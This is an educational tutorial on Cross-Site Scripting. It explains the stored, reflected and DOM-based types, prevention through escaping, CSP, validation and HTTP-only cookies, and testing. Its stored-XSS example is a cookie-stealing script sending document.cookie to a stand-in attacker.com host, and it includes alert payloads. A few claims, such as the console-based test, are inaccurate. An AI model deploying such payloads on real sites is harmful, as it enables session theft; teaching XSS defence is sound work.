                                        Cross-Site Scripting (XSS)  

 1. What is XSS?  
Cross-Site Scripting (XSS) is a web security vulnerability where
 an attacker injects malicious JavaScript into a web page, which then executes in the browser of unsuspecting users. 
This can lead to:  
‚úÖ Data theft (cookies, session tokens, form inputs).  
‚úÖ Defacement (modifying the webpage).  
‚úÖ Phishing (stealing credentials).  
‚úÖ Session hijacking (stealing authentication tokens).  

----------------------------------------------------------------------------------------

 2. How XSS Works (Attack Process)
1. An attacker injects malicious JavaScript into a website (e.g., via a form, URL, or database).  
2. The website displays this script as part of the page without proper sanitization.  
3. Users visit the page, and the malicious JavaScript executes in their browser.  
4. The script steals data, redirects users, or performs actions on their behalf.  

----------------------------------------------------------------------------------------

 3. Types of XSS Attacks
 üü¢ 1. Stored XSS (Persistent XSS)
- Malicious script is stored in the website's database and executed for all visitors.  
- Most dangerous since it affects multiple users.  

Example: A malicious comment stored in a database  
`````````````````````````````````````````````````````````````````html
<!-- Attacker inputs this comment in a blog post -->
<script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>
`````````````````````````````````````````````````````````````````
- When another user views the comment, their browser executes the script, sending cookies to the attacker's server.  

‚úÖ Prevention: Escape user input before storing/displaying it (`htmlspecialchars` in PHP, `encodeURIComponent` in JavaScript).  

----------------------------------------------------------------------------------------

 üü° 2. Reflected XSS (Non-Persistent XSS)
- The attack relies on tricking a victim into clicking a malicious link that contains a script.  
- The website reflects the script in the response without sanitization.  

Example: A malicious URL in a search query  
`````````````````````````````````````````````````````````````````
https://example.com/search?q=<script>alert('Hacked!')</script>
`````````````````````````````````````````````````````````````````
If the website directly outputs the query without escaping, the script executes.  

‚úÖ Prevention: Validate and encode user input before reflecting it on the page.  

----------------------------------------------------------------------------------------

 üîµ 3. DOM-Based XSS
- The attack modifies the page dynamically using JavaScript without involving the server.  
- Happens when JavaScript processes untrusted input from `document.URL`, `location.hash`, or `innerHTML`.  

Example: A vulnerable JavaScript code snippet
`````````````````````````````````````````````````````````````````js
document.getElementById('message').innerHTML = location.search;
`````````````````````````````````````````````````````````````````
If the user visits:  
`````````````````````````````````````````````````````````````````
https://example.com/page?message=<script>alert('XSS')</script>
`````````````````````````````````````````````````````````````````
The page executes the script inside the browser.  

‚úÖ Prevention: Use `.textContent` instead of `.innerHTML`, and avoid injecting untrusted data directly into the DOM.  

----------------------------------------------------------------------------------------

 4. How to Prevent XSS
 ‚úÖ 1. Use HTML Escaping (Output Encoding)
Sanitize user input before displaying it on the page.  
- In PHP (Laravel Blade):  
  `````````````````````````````````````````````````````````````````php
  {{ $variable }}  <!-- Automatically escapes HTML in Laravel -->
  `````````````````````````````````````````````````````````````````
- Use `htmlspecialchars()` in raw PHP:  
  `````````````````````````````````````````````````````````````````php
  echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
  `````````````````````````````````````````````````````````````````
- In JavaScript:  
  `````````````````````````````````````````````````````````````````js
  element.textContent = userInput; // Safe
  element.innerHTML = userInput; // Dangerous!
  `````````````````````````````````````````````````````````````````

----------------------------------------------------------------------------------------

 ‚úÖ 2. Use Content Security Policy (CSP)
- CSP blocks inline scripts and limits allowed sources.  
- Example policy to allow only scripts from the same origin:  
  `````````````````````````````````````````````````````````````````http
  Content-Security-Policy: default-src 'self'; script-src 'self';
  `````````````````````````````````````````````````````````````````

----------------------------------------------------------------------------------------

 ‚úÖ 3. Sanitize Input (Server-Side Validation)
- Remove dangerous characters from user input before storing it.  
- Use Laravel validation rules to prevent script injection:  
  `````````````````````````````````````````````````````````````````php
  $request->validate([
      'name' => 'string|max:255|regex:/^[a-zA-Z\s]+$/'
  ]);
  `````````````````````````````````````````````````````````````````

----------------------------------------------------------------------------------------

 ‚úÖ 4. Avoid `eval()` and `innerHTML`
- Never use `eval()` to execute user input in JavaScript.  
  `````````````````````````````````````````````````````````````````js
  eval(userInput); // ‚ö†Ô∏è Dangerous! Never do this
  `````````````````````````````````````````````````````````````````
- Instead of `.innerHTML`, use `.textContent`.  

----------------------------------------------------------------------------------------

 ‚úÖ 5. Use HTTP-Only Cookies
- Prevent JavaScript from accessing session cookies.  
- In Laravel, enable HTTP-Only cookies in `config/session.php`:  
  `````````````````````````````````````````````````````````````````php
  'http_only' => true,
  `````````````````````````````````````````````````````````````````

 5. XSS vs. CSRF (Comparison)
 ________________________________________________________________________________
| Feature               | XSS                 | CSRF                             |
|_______________________|_____________________|__________________________________|
| Targets               | End-users           | Server/API                       |
| Attack Method         | Injects JavaScript  | Trick user into sending requests |
| Requires User Action? | No                  | Yes (clicking a link)            |
| Prevention            | Escaping Output, CSP| CSRF Tokens, SameSite Cookies    |
|_______________________|_____________________|__________________________________|

----------------------------------------------------------------------------------------

 6. How to Test for XSS
 üîç Using Browser Developer Tools
1. Open DevTools (F12) ‚Üí Console.  
2. Type:  
   `````````````````````````````````````````````````````````````````js
   alert(document.cookie);
   `````````````````````````````````````````````````````````````````
3. If the site allows this in user inputs, it's vulnerable.  

 üîç Using Burp Suite
1. Intercept a request with Burp Suite.  
2. Inject a payload like:  
   `````````````````````````````````````````````````````````````````html
   <script>alert('XSS')</script>
   `````````````````````````````````````````````````````````````````
3. If the script executes, the site is vulnerable.  

----------------------------------------------------------------------------------------

 7. Summary
‚úÖ XSS allows JavaScript injection to steal data or hijack user sessions.  
‚úÖ Stored XSS is the most dangerous (affects multiple users).  
‚úÖ Use HTML escaping, CSP, input validation, and secure cookies to prevent it.
